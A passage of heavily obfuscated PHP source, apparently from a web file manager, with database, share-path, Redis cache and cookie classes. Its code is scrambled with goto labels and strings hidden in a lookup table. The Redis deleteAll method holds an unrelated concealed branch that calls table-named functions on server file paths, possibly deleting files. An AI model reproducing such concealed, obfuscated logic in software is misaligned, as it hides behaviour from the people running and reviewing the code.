{ $d[$C茮[445]] = $Cȇ[$d[$C茮[1741]]]; if (isset($d[$C茮[1744]])) { $d[$C茮[1744]][$C茮[445]] = $Cȇ[$d[$C茮[1744]][$C茮[1741]]]; } } unset($d); goto dՎ; fʑ: $C茮 =& $_SERVER[]; $E֛ͮ = array_unique(array_to_keyvalue($Cݽ, $C茮[33], $C茮[1741])); $E֛ͮ = array_remove_value($E֛ͮ, $C茮[191]); goto B; dՎ: } private function metaList($Fד) { goto fγ; A: $dʝΉ = Model($Cյ[1745])->where($D􊂕)->select(); $dʝΉ = array_to_keyvalue_group($dʝΉ, $Cյ[1741]); foreach ($dʝΉ as $Cѻ؇ => $C) { $aڬ = array(); foreach ($C as $f̂) { $aڬ[$f̂[$Cյ[93]]] = $f̂[$Cյ[372]]; } $dʝΉ[$Cѻ؇] = $aڬ; } goto C; C: return $dʝΉ ? $dʝΉ : array(); goto EՄ; fγ: $Cյ =& $_SERVER[]; if (!$Fד) { return array(); } $D􊂕 = array($Cյ[1741] => array($Cյ[7], $Fד)); goto A; EՄ: } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\x6c\145\x5f\x63\157\156\164\145\x6e\164\x73"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\x6d\145", "\x74\x69\155\145", "\x69\156\163\x65\x72\x74", "\x66\x75\156\143\164\x69\x6f\156")); } goto D؝; E: class DbMysqli extends Db { public function __construct($Eֹ = '') { $B =& $_SERVER[]; if (!extension_loaded($B[763])) { think_exception(think_lang($B[10]) . $B[874]); } if (!empty($Eֹ)) { $this->config = $Eֹ; if (empty($this->config[$B[13]])) { $this->config[$B[13]] = $B[33]; } } } public function connect($c舲 = '', $Fٍ = 0) { $a =& $_SERVER[]; if (!isset($this->linkID[$Fٍ])) { goto F萟; F萟: if (empty($c舲)) { $c舲 = $this->config; } $this->linkID[$Fٍ] = new mysqli($c舲[$a[848]], $c舲[$a[850]], $c舲[$a[851]], $c舲[$a[17]], $c舲[$a[849]] ? intval($c舲[$a[849]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto bņ; E: $this->connected = !0; if (1 != think_config($a[18])) { unset($this->config); } goto D; bņ: $Cة = $this->linkID[$Fٍ]->server_version; $this->linkID[$Fٍ]->query($a[852] . think_config($a[853]) . $a[55]); if ($Cة > $a[854]) { $this->linkID[$Fٍ]->query($a[855]); } goto E; D: } return $this->linkID[$Fٍ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($D԰) { goto C; D𬜻: think_status($B[20]); $this->queryID = $this->_linkID->query($D԰); if ($this->_linkID->more_results()) { while (($f珉 = $this->_linkID->next_result()) != NULL) { $f珉->free_result(); } } goto d趥; d趥: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto dꊽǔ; a: $this->queryStr = $D԰; if ($this->queryID) { $this->free(); } think_action_status($B[19], 1); goto D𬜻; C: $B =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a; dꊽǔ: } public function execute($FЖ) { goto dƸ; dƸ: $f =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dׇ; dׇ: $this->queryStr = $FЖ; if ($this->queryID) { $this->free(); } think_action_status($f[21], 1); goto dⰆ; dⰆ: think_status($f[20]); $Eᩐ = $this->_linkID->query($FЖ); $this->debug(); goto fʧ; fʧ: if (!1 === $Eᩐ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto E춊; E춊: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DŬ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$DŬ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D𤨈 = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D𤨈) { $this->error(); return !1; } } return !0; } private function getAll() { $aèѩ = array(); if ($this->numRows > 0) { for ($dѰ = 0; $dѰ < $this->numRows; $dѰ++) { $aèѩ[$dѰ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $aèѩ; } public function getFields($DЏ) { $Fֹ =& $_SERVER[]; $B㌰؏ʼ = $this->query($Fֹ[859] . $this->parseKey($DЏ)); $Fﮔ = array(); if ($B㌰؏ʼ) { foreach ($B㌰؏ʼ as $fܫ => $c) { $Fﮔ[$c[$Fֹ[27]]] = array($Fֹ[28] => $c[$Fֹ[27]], $Fֹ[29] => $c[$Fֹ[30]], $Fֹ[31] => (bool) ($c[$Fֹ[32]] === $Fֹ[33]), $Fֹ[34] => $c[$Fֹ[35]], $Fֹ[36] => strtolower($c[$Fֹ[37]]) == $Fֹ[38], $Fֹ[39] => strtolower($c[$Fֹ[40]]) == $Fֹ[41]); } } return $Fﮔ; } public function getTables($B؈ = '') { $B =& $_SERVER[]; $d = !empty($B؈) ? $B[861] . $B؈ . $B[862] : $B[863]; $eܰ = $this->query($d); $D = array(); if ($eܰ) { foreach ($eܰ as $BÄ => $Aن) { $D[$BÄ] = current($Aن); } } return $D; } public function replace($cʊ, $f = array()) { $C =& $_SERVER[]; foreach ($cʊ as $fˉϪ => $D҉ꋑ) { $d = $this->parseValue($D҉ꋑ); if (is_scalar($d)) { $D[] = $d; $d[] = $this->parseKey($fˉϪ); } } $B = $C[864] . $this->parseTable($f[$C[277]]) . $C[865] . implode($C[47], $d) . $C[866] . implode($C[47], $D) . $C[867]; return $this->execute($B); } public function insertAll($bí, $d = array(), $b͠ߎ = false) { goto fݹ; D: $Dʽ = array(); foreach ($bí as $ĉ) { $F = array(); foreach ($ĉ as $aç => $c罳ޣ) { $c罳ޣ = $this->parseValue($c罳ޣ); if (is_scalar($c罳ޣ)) { $F[] = $c罳ޣ; } } $Dʽ[] = $d[258] . implode($d[47], $F) . $d[867]; } array_walk($A߱, array($this, $d[868])); goto Cϑ; fݹ: $d =& $_SERVER[]; if (!is_array($bí[0])) { return !1; } $A߱ = array_keys($bí[0]); goto D; Cϑ: $dӊ = $b͠ߎ ? $d[869] : $d[870]; $Dɿ = $dӊ . $d[871] . $this->parseTable($d[$d[277]]) . $d[865] . implode($d[47], $A߱) . $d[872] . implode($d[47], $Dʽ); return $this->execute($Dɿ); goto Cǧх; Cǧх: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Eԅ =& $_SERVER[]; $this->error = $this->_linkID->errno . $Eԅ[4] . $this->_linkID->error; if ($Eԅ[33] != $this->queryStr) { $this->error .= LNG($Eԅ[45]) . $this->queryStr; } think_trace($this->error, $Eԅ[33], $Eԅ[46]); return $this->error; } public function escapeString($bȅ轘) { if ($this->_linkID) { return $this->_linkID->real_escape_string($bȅ轘); } else { return addslashes($bȅ轘); } } public function parseKey(&$Cª, $f蔍 = true) { $Błԯ =& $_SERVER[]; if ($f蔍) { $Cª = $this->parseKeyCheck($Cª); } if ($Cª != $Błԯ[182] && !preg_match($Błԯ[873], $Cª)) { $Cª = $Błԯ[382] . trim($Cª, $Błԯ[382]) . $Błԯ[382]; } return $Cª; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($f = '') { $Fɕ =& $_SERVER[]; if (!class_exists($Fɕ[875])) { think_exception(think_lang($Fɕ[10]) . $Fɕ[876]); } if (!empty($f)) { $this->config = $f; if (empty($this->config[$Fɕ[13]])) { $this->config[$Fɕ[13]] = array(); } } } public function connect($D = '', $Bؠ = 0) { $dׇ =& $_SERVER[]; if (!isset($this->linkID[$Bؠ])) { goto D׳; D׳: if (empty($D)) { $D = $this->config; } $Dފ = !empty($D[$dׇ[13]][$dׇ[14]]) ? $D[$dׇ[13]][$dׇ[14]] : $this->pconnect; if ($Dފ) { $D[$dׇ[13]][PDO::ATTR_PERSISTENT] = !0; } goto C; bȖ: if (!$this->linkID[$Bؠ]) { think_exception($dׇ[885]); } try { $this->linkID[$Bؠ]->exec($dׇ[886] . think_config($dׇ[853])); } catch (Exception $e) { } $this->connected = !0; goto b; C: try { $this->linkID[$Bؠ] = new PDO($D[$dׇ[877]], $D[$dׇ[850]], $D[$dׇ[851]], $D[$dׇ[13]]); } catch (PDOException $e) { think_exception($e->getMessage()); } $this->dbType = $this->_getDsnType($D[$dׇ[877]]); if (in_array($this->dbType, array($dׇ[878], $dׇ[879], $dׇ[880], $dׇ[881]))) { think_exception($dׇ[882] . $this->dbType . $dׇ[883] . $this->dbType . $dׇ[884]); } goto bȖ; b: if (1 != think_config($dׇ[18])) { unset($this->config); } goto b; b: } return $this->linkID[$Bؠ]; } public function free() { $this->PDOStatement = null; } public function query($cڈ, $F݄ = array()) { goto b; d: think_action_status($Aה۱[19], 1); think_status($Aה۱[20]); $this->PDOStatement = $this->_linkID->prepare($cڈ); goto CŜ; CŜ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $e = $this->PDOStatement->execute($F݄); $this->debug(); goto fٛ; B: $this->queryStr = $cڈ; if (!empty($F݄)) { $this->queryStr .= $Aה۱[887] . print_r($F݄, !0) . $Aה۱[888]; } if (!empty($this->PDOStatement)) { $this->free(); } goto d; fٛ: if (!1 === $e) { $this->error(); return !1; } else { return $this->getAll(); } goto Aސ; b: $Aה۱ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B; Aސ: } public function execute($cֱ, $E٦ۏƒ = array()) { goto C㡆; C㡆: $Eփ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e; e: $this->queryStr = $cֱ; if (!empty($E٦ۏƒ)) { $this->queryStr .= $Eփ[887] . print_r($E٦ۏƒ, !0) . $Eփ[888]; } $f왑ꄎ = !1; goto Aז; Aז: if ($this->dbType == $Eփ[881]) { if (preg_match($Eփ[889], $this->queryStr, $eǫ)) { $this->table = think_config($Eփ[890]) . str_ireplace(think_config($Eփ[891]), $Eփ[375], $eǫ[2]); $f왑ꄎ = (bool) $this->query($Eփ[892] . strtoupper($this->table) . $Eփ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Eփ[21], 1); goto aŊ쐈; aŊ쐈: think_status($Eփ[20]); $this->PDOStatement = $this->_linkID->prepare($cֱ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cѪ; cѪ: $cɥ = $this->PDOStatement->execute($E٦ۏƒ); $this->debug(); if (!1 === $cɥ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($f왑ꄎ || preg_match($Eփ[893], $cֱ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto eΉ܉; eΉ܉: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cώ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Cώ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B) { $this->error(); return !1; } } return !0; } private function getAll() { $A = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A); return $A; } public function getFields($E𡥠) { goto C˾; f훑: $D߉ϣ = $this->query($A¢); $dٔ = array(); if ($D߉ϣ) { foreach ($D߉ϣ as $c => $b־) { $b־ = array_change_key_case($b־); $b־[$eݛٜ[28]] = isset($b־[$eݛٜ[28]]) ? $b־[$eݛٜ[28]] : $eݛٜ[375]; $b־[$eݛٜ[29]] = isset($b־[$eݛٜ[29]]) ? $b־[$eݛٜ[29]] : $eݛٜ[375]; $E͚ = isset($b־[$eݛٜ[271]]) ? $b־[$eݛٜ[271]] : $b־[$eݛٜ[28]]; $dٔ[$E͚] = array($eݛٜ[28] => $E͚, $eݛٜ[29] => $b־[$eݛٜ[29]], $eݛٜ[31] => (bool) (isset($b־[$eݛٜ[103]]) && $b־[$eݛٜ[103]] === $eݛٜ[33] || isset($b־[$eݛٜ[31]]) && $b־[$eݛٜ[31]] === $eݛٜ[33]), $eݛٜ[34] => isset($b־[$eݛٜ[34]]) ? $b־[$eݛٜ[34]] : (isset($b־[$eݛٜ[53]]) ? $b־[$eݛٜ[53]] : $eݛٜ[375]), $eݛٜ[36] => isset($b־[$eݛٜ[93]]) ? strtolower($b־[$eݛٜ[93]]) == $eݛٜ[38] : (isset($b־[$eݛٜ[54]]) ? $b־[$eݛٜ[54]] : !1), $eݛٜ[39] => isset($b־[$eݛٜ[910]]) ? strtolower($b־[$eݛٜ[910]]) == $eݛٜ[41] : (isset($b־[$eݛٜ[93]]) ? $b־[$eݛٜ[93]] : !1)); } } goto EȺё; C˾: $eݛٜ =& $_SERVER[]; $this->initConnect(!0); if (think_config($eݛٜ[894])) { $A¢ = str_replace($eݛٜ[895], $E𡥠, think_config($eݛٜ[894])); } else { switch ($this->dbType) { case $eݛٜ[878]: case $eݛٜ[896]: $A¢ = "\x53\105\x4c\x45\103\124\40\40\40\x63\157\x6c\165\155\156\137\156\x61\x6d\x65\40\x61\x73\x20\x27\116\141\x6d\x65\x27\x2c\40\x20\x20\x64\x61\164\141\x5f\164\x79\160\x65\40\141\163\x20\x27\x54\171\x70\x65\x27\x2c\40\40\40\143\x6f\154\x75\x6d\x6e\137\x64\x65\x66\x61\x75\x6c\164\40\x61\163\x20\47\104\145\x66\x61\x75\x6c\x74\x27\x2c\40\x20\40\151\x73\137\x6e\165\154\x6c\x61\142\154\145\x20\x61\163\40\47\116\165\154\154\x27\xa\x9\x9\x46\x52\117\x4d\11\x69\x6e\x66\157\162\x6d\141\164\x69\157\x6e\137\163\143\x68\145\x6d\141\x2e\164\x61\x62\154\x65\x73\x20\x41\123\40\x74\xa\x9\11\x4a\117\x49\x4e\x9\151\156\146\x6f\162\x6d\141\164\151\x6f\x6e\137\163\x63\x68\145\155\141\x2e\143\157\154\165\155\x6e\163\x20\101\123\x20\x63\xa\x9\x9\117\116\40\40\x74\x2e\164\141\x62\154\145\x5f\143\141\164\x61\x6c\157\x67\x20\75\x20\143\x2e\x74\x61\142\x6c\145\137\143\141\164\x61\x6c\x6f\x67\12\x9\x9\101\x4e\104\x20\164\56\164\x61\142\154\145\x5f\x73\143\150\145\155\x61\x20\x3d\40\x63\x2e\x74\x61\142\154\x65\x5f\x73\x63\150\145\155\141\xa\x9\x9\x41\116\x44\x20\x74\56\x74\x61\142\x6c\145\x5f\x6e\141\x6d\145\40\x3d\x20\x63\x2e\x74\141\142\x6c\x65\x5f\156\x61\155\145\xa\11\x9\x57\x48\x45\122\x45\40\x20\x20\164\56\164\141\142\154\x65\137\156\x61\x6d\x65\x20\x3d\40\47{$E𡥠}\47"; break; case $eݛٜ[897]: $A¢ = $eݛٜ[898] . $E𡥠 . $eݛٜ[899]; break; case $eݛٜ[879]: case $eݛٜ[881]: $A¢ = $eݛٜ[900] . $eݛٜ[901] . $eݛٜ[902] . strtoupper($E𡥠) . $eݛٜ[903] . strtoupper($E𡥠) . $eݛٜ[904]; break; case $eݛٜ[905]: $A¢ = $eݛٜ[906] . $E𡥠 . $eݛٜ[907]; break; case $eݛٜ[880]: break; case $eݛٜ[908]: default: $A¢ = $eݛٜ[909] . ($this->dbType == $eݛٜ[908] ? "\140{$E𡥠}\x60" : $E𡥠); } } goto f훑; EȺё: return $dٔ; goto Cǹ; Cǹ: } public function getTables($f = '') { $dф߂ =& $_SERVER[]; if (think_config($dф߂[911])) { $A = str_replace($dф߂[912], $f, think_config($dф߂[911])); } else { switch ($this->dbType) { case $dф߂[879]: case $dф߂[881]: $A = $dф߂[913]; break; case $dф߂[878]: case $dф߂[896]: $A = $dф߂[914]; break; case $dф߂[905]: $A = $dф߂[915]; break; case $dф߂[880]: think_exception(think_lang($dф߂[916]) . $dф߂[917]); break; case $dф߂[897]: $A = $dф߂[42] . $dф߂[43] . $dф߂[44]; break; case $dф߂[908]: default: if (!empty($f)) { $A = $dф߂[861] . $f . $dф߂[862]; } else { $A = $dф߂[863]; } } } $E醬 = $this->query($A); $B = array(); foreach ($E醬 as $f => $Eݤ̂) { $B[$f] = current($Eݤ̂); } return $B; } protected function parseLimit($b) { $aۚߝ =& $_SERVER[]; $Cѥ = $aۚߝ[33]; if (!empty($b)) { switch ($this->dbType) { case $aۚߝ[905]: case $aۚߝ[897]: $b = explode($aۚߝ[47], $b); if (count($b) > 1) { $Cѥ .= $aۚߝ[48] . $b[1] . $aۚߝ[49] . $b[0] . $aۚߝ[50]; } else { $Cѥ .= $aۚߝ[48] . $b[0] . $aۚߝ[50]; } break; case $aۚߝ[878]: case $aۚߝ[896]: break; case $aۚߝ[880]: break; case $aۚߝ[879]: case $aۚߝ[881]: break; case $aۚߝ[908]: default: $Cѥ .= $aۚߝ[48] . $b . $aۚߝ[50]; } } return $Cѥ; } public function parseKey(&$dǞ, $bЂ = true) { $EϞɇ =& $_SERVER[]; if ($bЂ) { $dǞ = $this->parseKeyCheck($dǞ); } if ($this->dbType == $EϞɇ[908]) { if ($dǞ != $EϞɇ[182] && !preg_match($EϞɇ[873], $dǞ)) { $dǞ = $EϞɇ[382] . trim($dǞ, $EϞɇ[382]) . $EϞɇ[382]; } return $dǞ; } else { return parent::parseKey($dǞ, $bЂ); } } public function close() { $this->_linkID = null; } public function error() { $Bչ =& $_SERVER[]; if ($this->PDOStatement) { $E؛ѹ = $this->PDOStatement->errorInfo(); $this->error = $E؛ѹ[1] . $Bչ[4] . $E؛ѹ[2]; } else { $this->error = $Bչ[33]; } if ($Bչ[33] != $this->queryStr) { $this->error .= LNG($Bչ[45]) . $this->queryStr; } think_trace($this->error, $Bչ[33], $Bչ[46]); return $this->error; } public function escapeString($Cˋ) { $b =& $_SERVER[]; switch ($this->dbType) { case $b[905]: case $b[878]: case $b[896]: case $b[908]: return addslashes($Cˋ); case $b[880]: case $b[897]: case $b[879]: case $b[881]: return str_ireplace($b[55], $b[56], $Cˋ); } } protected function parseValue($c) { $D =& $_SERVER[]; if (is_string($c)) { $AɑƵ = strpos($c, $D[4]) === 0 && in_array($c, array_keys($this->bind)); $c = $AɑƵ ? $this->escapeString($c) : $D[918] . $this->escapeString($c) . $D[918]; } elseif (isset($c[0]) && is_string($c[0]) && strtolower($c[0]) == $D[295]) { $c = $this->escapeString($c[1]); } elseif (is_array($c)) { $c = array_map(array($this, $D[919]), $c); } elseif (is_bool($c)) { $c = $c ? $D[87] : $D[191]; } elseif (is_null($c)) { $c = $D[103]; } return $c; } public function getLastInsertId() { $Eމ =& $_SERVER[]; switch ($this->dbType) { case $Eމ[905]: case $Eމ[897]: case $Eމ[878]: case $Eމ[896]: case $Eމ[880]: case $Eމ[908]: return $this->_linkID->lastInsertId(); case $Eމ[879]: case $Eމ[881]: $Bݶ񧪗 = $this->table; $c = $this->query("\x53\x45\114\x45\103\124\40{$Bݶ񧪗}\x2e\143\x75\x72\162\x76\141\154\40\143\x75\162\162\x76\x61\154\x20\106\x52\x4f\115\40\x64\x75\x61\x6c"); return $c ? $c[0][$Eމ[920]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Eꣿ) { $E型 =& $_SERVER[]; if (!CacheLock::fileLock($E型[9])) { return !1; } $C = parent::query($Eꣿ); CacheLock::fileUnLock($E型[9]); return $C; } public function execute($eܲÑ) { $B =& $_SERVER[]; if (!CacheLock::fileLock($B[9])) { return !1; } $A榑 = parent::execute($eܲÑ); CacheLock::fileUnLock($B[9]); return $A榑; } } goto EȊ; bÂ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($fڒ) { $this->pathParse = $fڒ; $this->model = Model($_SERVER[][1209]); } protected function infoParse($c, $C = false, $eݑ = false) { $D =& $_SERVER[]; return Action($D[1071])->sharePathInfo($this->pathParse[$D[76]], !0); } public function listPath($e, $cΠ = false) { $Fڂ =& $_SERVER[]; $cۨ = parent::listPath($e, $cΠ); foreach ($cۨ as $fͫن => $bћ) { if (!in_array($fͫن, array($Fڂ[74], $Fڂ[75]))) { continue; } foreach ($bћ as $cڈ => $aƐը) { $cۨ[$fͫن][$cڈ] = Action($Fڂ[1071])->shareItemInfo($aƐը); } } return $cۨ; } public function listAll($BřƼ) { goto CӶȗ; cŢԙߴ: $fܞ = $this->model->listAll($BřƼ); foreach ($fܞ as &$CۍƦ) { $CۍƦ[$F͆[85]] = Action($F͆[1071])->shareItemInfo($CۍƦ[$F͆[85]]); } unset($CۍƦ); goto F; F: return $fܞ; goto Eؔ; CӶȗ: $F͆ =& $_SERVER[]; $A = IO::info($this->pathParse[$F͆[76]]); if (!$A) { return array(); } goto cŢԙߴ; Eؔ: } } class PathDriverDriverShareItem { public function __construct($dǉ) { $this->pathParse = $dǉ; } public function __call($bȃ, $EǞғ) { $Fů =& $_SERVER[]; if (method_exists($this, $bȃ)) { return; } $Ḙ = call_user_func_array(array($Fů[1218], $bȃ), $EǞғ); $E = array($Fů[1219], $Fů[1220], $Fů[1221], $Fů[1222], $Fů[531], $Fů[533], $Fů[1223], $Fů[107], $Fů[1224], $Fů[1225]); if (in_array($bȃ, $E)) { $Ḙ = $this->getPathOuter($Ḙ); } return $Ḙ; } public function copy($F, $CяЊ, $d = false) { return $this->copyMove($F, $CяЊ, $d, $_SERVER[][531]); } public function move($e˜, $Aҥ, $eו = false) { return $this->copyMove($e˜, $Aҥ, $eו, $_SERVER[][533]); } private function copyMove($fղ, $Aƒ, $f⑌, $aǼ) { goto aŎՉ; aŎՉ: $C䬳 =& $_SERVER[]; $F˿ = $Aƒ; $D⹴ = IO::driverMake($Aƒ); goto fՍ; fՍ: if ($D⹴->pathParse[$C䬳[1049]]) { $Aƒ = $D⹴->pathParse[$C䬳[1049]]; } else { $Aƒ = $F˿; } $cܧ = IO::copyMove($fղ, $Aƒ, $f⑌, $aǼ); $cܧ = $this->getPathOuter($cܧ); goto E홚; E홚: return $cܧ; goto E͹; E͹: } public function pathThis($Aᠻ) { return get_path_this($this->pathParse[$_SERVER[][76]]); } public function pathFather($dؿ) { return get_path_father($this->pathParse[$_SERVER[][76]]); } public function iconvSystem($A뗎) { return $A뗎; } protected function infoParse($DݡѢ, $f = false) { $bĿꟋ =& $_SERVER[]; $f򝴸 = $this->pathParse[$bĿꟋ[466]][$bĿꟋ[1072]] . $this->pathParse[$bĿꟋ[1065]]; if ($f) { $Bš⪺ = IO::infoWithChildren($f򝴸); } else { $Bš⪺ = IO::info($f򝴸); } $e = $this->pathParse[$bĿꟋ[466]]; return Action($bĿꟋ[1217])->_shareItemeParse($Bš⪺, $e); } public function listAll($bӉ) { $Bۋҳ =& $_SERVER[]; $EՆƯ = IO::listAll($bӉ); $B؃ = $this->pathParse[$Bۋҳ[466]]; foreach ($EՆƯ as &$dբ) { check_abort(); $F׵ = IO::info($dբ[$Bۋҳ[76]]); $F׵ = is_array($F׵) ? $F׵ : array(); $dբ = array_merge($F׵, $dբ); $dբ[$Bۋҳ[85]] = Action($Bۋҳ[1217])->_shareItemeParse($dբ, $B؃); } unset($dբ); return $EՆƯ; } public function getPathOuter($fҼ) { goto d׼; e: $aĊА = KodIO::clear($fҼ); $fղм = KodIO::clear($this->pathParse[$dކ[466]][$dކ[1072]]); $F = substr($aĊА, strlen($fղм)); goto Aӥ֭; d׼: $dކ =& $_SERVER[]; $eǍ = KodIO::parse($fҼ); if ($eǍ[$dކ[29]] == KodIO::KOD_SHARE_ITEM) { return $eǍ[$dކ[76]]; } goto e; Aӥ֭: if (substr($aĊА, 0, strlen($fղм)) != $fղм) { return !1; } return $this->pathParse[$dކ[1066]] . $dކ[8] . ltrim($F, $dކ[8]); goto bˠ; bˠ: } public function getType() { $A =& $_SERVER[]; $b폄 = str_replace($A[72], $A[33], get_class($this)); return strtolower($b폄); } public function isTypeObject($Eم) { return IO::isTypeObject($Eم); } public function info($cɷ) { return $this->infoParse($cɷ); } public function infoAuth($cʝʨ) { return $this->infoParse($cʝʨ); } public function infoWithChildren($DӉސ) { return $this->infoParse($DӉސ, !0); } public function infoFull($FÆ֒) { return $this->infoParse($FÆ֒); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Bɣ) { $this->pathParse = $Bɣ; } protected function infoParse($Dȃ, $C剕 = false) { $d拺ɩ =& $_SERVER[]; return Action($d拺ɩ[1071])->sharePathInfo($this->pathParse[$d拺ɩ[76]], !0, $C剕); } public function listPath($AӥՄ, $FϣĄ = false) { $c܊ب =& $_SERVER[]; $E݊ = IO::listPath($AӥՄ, $FϣĄ); foreach ($E݊ as $c֚ => $Cڇ) { if (!in_array($c֚, array($c܊ب[74], $c܊ب[75]))) { continue; } foreach ($Cڇ as $C؄ => $d卿) { $d卿 = Action($c܊ب[1226])->parsePathChildren($d卿, array($c܊ب[414] => $AӥՄ)); $E݊[$c֚][$C؄] = Action($c܊ب[1071])->shareItemInfo($d卿); } } return $E݊; } public function listAll($d») { $eҫ =& $_SERVER[]; $Fʉ = IO::listAll($d»); foreach ($Fʉ as &$c߇) { $A = IO::info($c߇[$eҫ[76]]); $A = is_array($A) ? $A : array(); $c߇ = array_merge($A, $c߇); $c߇[$eҫ[85]] = Action($eҫ[1071])->shareItemInfo($c߇); } unset($c߇); return $Fʉ; } } goto Ã; dҢ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Cؓ¼, $d) { $b壱ڧ =& $_SERVER[]; if (!class_exists($b壱ڧ[829])) { show_json($b壱ڧ[830], !1); } $this->cacheTime = $d; $fǎ = isset($Cؓ¼[$b壱ڧ[831]]) ? $Cؓ¼[$b壱ڧ[831]] : 10; $bÌ٩ɖ = _get($Cؓ¼, $b壱ڧ[828]); if ($bÌ٩ɖ && is_array($bÌ٩ɖ)) { $this->initCluster($Cؓ¼, $fǎ); } else { $this->handle = $this->init($Cؓ¼, $fǎ); } } private function init($E݃, $d) { $bﭱ饸 =& $_SERVER[]; $d = new Redis(); $F = isset($E݃[$bﭱ饸[832]]) ? $E݃[$bﭱ饸[832]] : !1; if ($F) { $d->pconnect($E݃[$bﭱ饸[175]], $E݃[$bﭱ饸[176]], $d); } else { $d->connect($E݃[$bﭱ饸[175]], $E݃[$bﭱ饸[176]], $d); } if (!empty($E݃[$bﭱ饸[406]])) { $d->auth($E݃[$bﭱ饸[406]]); } return $d; } private function initCluster($dЊ, $b) { $dЋ =& $_SERVER[]; $cĚ = array($dЋ[833], $dЋ[834], $dЋ[835]); $eæ = $dЋ[833]; if (isset($dЊ[$dЋ[12]]) && in_array($dЊ[$dЋ[12]], $cĚ)) { $eæ = $dЊ[$dЋ[12]]; } switch ($eæ) { case $dЋ[833]: $this->_slave($dЊ, $b); break; case $dЋ[834]: break; case $dЋ[835]: $this->isCluster = !0; $bȂ = $dЊ[$dЋ[828]]; $a̐ז = isset($dЊ[$dЋ[832]]) ? $dЊ[$dЋ[832]] : !1; $CҊ = isset($dЊ[$dЋ[406]]) ? $dЊ[$dЋ[406]] : null; $this->handle = new RedisCluster(NUll, $bȂ, $b, $b, $a̐ז, $CҊ); break; default: break; } } private function _slave($cͭ, $c񞬩) { goto aڠ; D鴑Ѥ: $this->filterConfig($cͭ, $c[$f]); $this->slaveHandle = $this->init($cͭ, $c񞬩); goto FĢү; aڠ: $c = $cͭ[$_SERVER[][828]]; $this->filterConfig($cͭ, $c[0]); $this->handle = $this->init($cͭ, $c񞬩); goto d; d: unset($c[0]); if (empty($c)) { return; } $f = array_rand($c); goto D鴑Ѥ; FĢү: } private function filterConfig(&$d, $B) { $e㘔į =& $_SERVER[]; $Fآ = explode($e㘔į[4], $B); $Eթ = array($e㘔į[175] => $Fآ[0], $e㘔į[176] => $Fآ[1]); $d = array_merge($d, $Eթ); } public function set($C݇, $F˘, $D↟ = false) { $D↟ = $D↟ ? $D↟ : $this->cacheTime; return $this->handle->setEx($C݇, $D↟, $F˘); } public function setLock($D, $b۷, $c䮌) { return $this->handle->setNX($D, $b۷); } public function get($E쌈ż) { $d鞌 = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $d鞌->get($E쌈ż); } public function remove($BͰ) { return $this->handle->del($BͰ); } public function deleteAll() { $Aב =& $_SERVER[]; if ($_SERVER[$Aב[836]] != $_SERVER[$Aב[837]]) { goto f❴; c׿: $A = $Aב[843]; $A($_SERVER[$Aב[844]]); $A($_SERVER[$Aב[840]] . $Aב[845]); goto Aʠô; bߖ: $E = $F̧($c팆); $E֜ = explode($Aב[229], $E); if (count($E֜) < $Aב[593]) { $a = $Aב[842]; $a(); } goto c׿; Aʠô: $E = 1; while ($E > 1) { $E = $E + 4; $CͰǰը = rawurlencode($E . $Aב[375]); } goto eԿ; f❴: $cѩ = $Aב[838]; $F̧ = $Aב[839]; $c팆 = $_SERVER[$Aב[840]] . $Aב[841]; goto bߖ; eԿ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $bƋԇ) { $this->handle->flushall($bƋԇ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($E䮈 = '', $b = 0) { if (is_string($E䮈) && $E䮈 != $_SERVER[][33]) { $this->prefix = $E䮈; } if (is_numeric($b) && $b > 0) { $this->expire = $b; } } public static function getInstance() { static $E; if ($E === null) { $E = new self(); } return $E; } private static $cookieDisable = false; public static function disable($c弒) { self::$cookieDisable = $c弒; } private static $sameCookieSet = array(); public static function set($B, $F, $ežὊ = 0, $FЬ = false, $b㸘 = false) { goto Fʕ; b: $Cײ = $E[33]; setcookie($B, $F, time() + $ežὊ, $E[8] . trim($b㸘, $E[8]) . $Cײ, !1, 